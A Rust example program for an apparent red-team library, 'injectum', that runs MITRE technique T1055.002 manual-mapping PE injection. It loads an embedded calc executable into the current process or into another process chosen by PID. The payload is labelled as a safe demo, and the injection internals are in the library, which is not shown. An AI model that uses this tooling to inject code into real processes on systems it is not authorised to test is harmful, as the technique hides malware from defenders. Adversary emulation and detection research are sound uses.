//! Example: T1055.002 - Portable Executable Injection (Manual Mapping)
//!
//! Build:
//! ```sh
//! cargo build --package injectum --example T1055_002_Manual_Mapping --features "tracing,T1055_002" --release
//! ```
//!
//! Usage:
//! ```sh
//! ./T1055_002_Manual_Mapping.exe [PID]
//! ```
//!
//! * (Empty) : Injects into the current process (Self-Injection).
//! * PID     : Injects into an existing process ID (Remote Injection).

#[cfg(not(feature = "tracing"))]
mod logs {
    #[macro_export]
    macro_rules! error { ($($arg:tt)*) => { let _ = format_args!($($arg)*); }; }
    #[macro_export]
    macro_rules! info { ($($arg:tt)*) => { let _ = format_args!($($arg)*); }; }
    #[macro_export]
    macro_rules! warn { ($($arg:tt)*) => { let _ = format_args!($($arg)*); }; }
}

use injectum::{
    Error, InjectorBuilder, Payload, PayloadMetadata, Result, Target, Technique,
    method::PortableExecutable,
};
use std::{env::args, io::stdin};
#[cfg(feature = "tracing")]
use tracing::{error, info};

// Note: Requires a valid PE file in the same folder.
const PE_BYTES: &[u8] = include_bytes!("calc_x64.exe");

fn main() {
    if let Err(e) = run() {
        error!("Error: {}", e);
    }
}

fn run() -> Result<()> {
    setup_logging();
    let target = parse_args()?;

    info!("------------------------------------------------");
    match &target {
        Target::CurrentProcess => info!("Target            : Current Process (Self-Injection)"),
        Target::Pid(pid) => info!("Target Process ID : {}", pid),
        _ => {}
    }
    info!("Technique         : T1055.002 (Manual Mapping)");
    info!("------------------------------------------------");

    inject_pe(&target)?;

    info!("Success: Injection completed.");
    if let Target::CurrentProcess = target {
        info!("Self-injection detected. Keeping process alive...");
        info!("Press ENTER to exit.");
        let mut buffer = String::new();
        let _ = stdin().read_line(&mut buffer);
    }
    Ok(())
}

/// Performs Manual Map PE Injection.
fn inject_pe(target: &Target) -> Result<()> {
    let payload = Payload::Executable {
        file_path: None,
        image_bytes: Some(PE_BYTES.to_vec()),
        metadata: PayloadMetadata {
            description: Some("Embedded PE".into()),
            origin: Some("Embedded Resource".into()),
            safe_sample: true,
            labels: vec!["demo".into()],
        },
    };
    let technique = Technique::T1055_002(PortableExecutable::ManualMapping);

    // Clone target for builder (Target is not Copy)
    let target_clone = match target {
        Target::Pid(id) => Target::Pid(*id),
        Target::CurrentProcess => Target::CurrentProcess,
        _ => return Err(Error::Validation("Unsupported target type.".into())),
    };

    InjectorBuilder::new()
        .target(target_clone)
        .technique(technique)
        .payload(payload)
        .execute()
}

/// Parses CLI arguments.
fn parse_args() -> Result<Target> {
    let cli_args: Vec<String> = args().collect();

    if cli_args.len() > 1 {
        let pid = cli_args[1]
            .parse::<u32>()
            .map_err(|_| Error::Validation("Invalid PID. Must be a positive integer.".into()))?;
        return Ok(Target::Pid(pid));
    }

    Ok(Target::CurrentProcess)
}

fn setup_logging() {
    #[cfg(feature = "tracing")]
    {
        use tracing_subscriber::EnvFilter;
        let _ = tracing_subscriber::fmt()
            .with_target(true)
            .with_env_filter(
                EnvFilter::try_from_default_env().unwrap_or_else(|_| EnvFilter::new("info")),
            )
            .without_time()
            .try_init();
    }
}
